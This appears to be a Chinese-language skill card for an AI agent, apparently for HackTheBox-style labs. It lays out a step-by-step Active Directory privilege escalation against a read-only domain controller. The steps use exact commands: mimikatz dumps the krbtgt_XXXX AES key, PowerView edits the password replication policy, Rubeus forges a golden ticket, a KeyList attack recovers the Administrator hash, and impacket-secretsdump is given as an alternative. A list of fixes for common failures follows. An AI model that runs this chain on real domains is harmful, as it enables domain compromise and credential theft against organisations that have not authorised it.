---
name: 'rodc-privesc-chain'
description: 'RODC 提权完整四步攻击链：dump krbtgt_XXXX AES密钥→修改复制策略→Golden Ticket→KeyList Attack。含所有常见错误和解决方案。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## RODC 提权完整攻击链

### 背景
RODC (Read-Only Domain Controller) 默认不缓存高权限账户（Domain Admins、Administrators 等）的密码。它有一个专属的 `krbtgt_XXXX` 账户（krbtgt 的 RODC 版本），密码复制策略 (PRP) 通过两个属性控制：
- `msDS-RevealOnDemandGroup`：允许缓存的组
- `msDS-NeverRevealGroup`：禁止缓存的组（默认包含 Administrators、Server Operators、Backup Operators 等）

### 攻击链（关键四步）

#### 阶段 0：获取 RODC SYSTEM 权限
通过任何方式拿到 RODC 的 SYSTEM shell（PsExec、RBCD + S4U、或其他）。

#### 阶段 1：Dump krbtgt_XXXX 密钥
```cmd
# 在 RODC 的 SYSTEM 上下文中运行 mimikatz：
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```text
⚠️ **关键**：必须用 `/inject /name:krbtgt_XXXX`，**不是** `/patch`！`/patch` 只显示 NTLM hash，`/inject` 才给出 AES256 密钥。
- NTLM: `445aa4221e751da37a10241d962780e2`
- AES256: `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`

#### 阶段 2：修改复制策略
```powershell
# ⚠️ 关键步骤：必须同时操作两个属性！
# 1. 将 Administrator 添加到允许复制组
Set-DomainObject -Identity RODC01$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local','CN=Administrator,CN=Users,DC=domain,DC=local')}
# 2. 清除拒绝复制组（默认包含 Administrators！）
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```text
⚠️ 如果只做步骤 1 不做步骤 2，Golden Ticket 会被 `KDC_ERR_TGT_REVOKED`。

#### 阶段 3：Golden Ticket
```cmd
Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes256:<AES_KEY> /user:Administrator /id:500 /domain:domain.local /sid:<DOMAIN_SID> /outfile:ticket.kirbi
```text
⚠️ 必须用 `/aes256:`，**不是** `/rc4:`！ServiceKeyType 必须是 `KERB_CHECKSUM_HMAC_SHA1_96_AES256`。

#### 阶段 4：KeyList Attack
```cmd
Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.local /dc:DC01.domain.local /ticket:ticket.kirbi
```text
成功后返回 Administrator 的 Password Hash（NTLM）。

### 替代方案：impacket
```bash
impacket-secretsdump -use-keylist -rodcNo 8245 -rodcKey <AES_KEY> domain/Administrator@DC_IP
```text

### 常见失败原因
1. **KDC_ERR_TGT_REVOKED**：`msDS-NeverRevealGroup` 未清除→Administrator 在拒绝列表中
2. **Golden ticket 无效**：用了 `/rc4:` 而非 `/aes256:`，或缺少 `/flags:forwardable,renewable,enc_pa_rep`
3. **mimikatz 不显示 AES 密钥**：用了 `/patch` 而非 `/inject /name:krbtgt_XXXX`
4. **session 错误**：asktgs 的 golden ticket 应在文件而非 PTT 中，且 /keylist 用文件路径

### 相关 HTB 机器
- Garfield
- 任何涉及 RODC 的 AD 靶机
